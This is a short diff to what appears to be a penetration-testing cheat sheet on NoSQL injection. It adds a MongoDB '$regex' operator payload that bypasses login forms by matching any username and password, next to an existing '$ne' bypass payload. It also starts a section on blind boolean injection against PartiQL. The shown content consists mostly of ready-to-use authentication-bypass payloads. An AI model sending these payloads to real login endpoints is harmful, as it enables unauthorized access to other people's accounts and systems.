@@ -8,6 +8,9 @@ Auth bypass via Mongo operator injection — try this when SQLMap finds nothing 
 
 # form-encoded (often the one that actually completes the login)
 username=<USER>&password[$ne]=asdf
+
+# $regex operator via a PHP-style array param — matches any value, not just a known one
+username[$regex]=.*&password[$regex]=.*
 ```
 
 Blind boolean injection on query-style NoSQL (e.g. DynamoDB PartiQL) when there's no `$ne`-style operator — same binary-search idea as blind SQLi, just with the dialect's own boolean functions:
